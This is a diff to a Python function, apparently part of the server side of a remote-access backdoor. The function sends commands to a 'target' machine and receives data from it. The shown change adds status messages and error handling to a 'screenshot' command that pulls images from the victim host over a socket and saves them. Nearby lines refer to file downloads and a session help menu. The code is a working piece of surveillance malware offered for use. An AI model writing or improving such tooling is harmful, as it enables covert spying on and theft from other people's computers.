@@ -217,18 +217,26 @@ def target_communication(target, ip):
                     else:
                         print('[+] File Downloaded')
             elif command[:10] == 'screenshot':
-                f = open('screenshot%d' % (count) + '.png', 'wb')
-                target.settimeout(3)
-                chunk = target.recv(1024)
-                while chunk:
-                    f.write(chunk)
-                    try:
-                        chunk = target.recv(1024)
-                    except socket.timeout as e:
-                        break
-                target.settimeout(None)
-                f.close()
-                count += 1
+                print("[*] Taking Screenshot")
+                try:
+                    f = open('screenshot%d' % (count) + '.png', 'wb')
+                    target.settimeout(3)
+                    chunk = target.recv(1024)
+                    while chunk:
+                        f.write(chunk)
+                        try:
+                            chunk = target.recv(1024)
+                        except socket.timeout as e:
+                            break
+                    target.settimeout(None)
+                    f.close()
+
+                except:
+                    print("[-] Can t take screenshot")
+                else:
+                    print("[+] Done Screenshot Saved As screenshot%d" % (count) + ".png")
+                    count += 1
+
             elif command == 'help':
                 print(('''\n
                     quit                                --> Quit Session With The Target
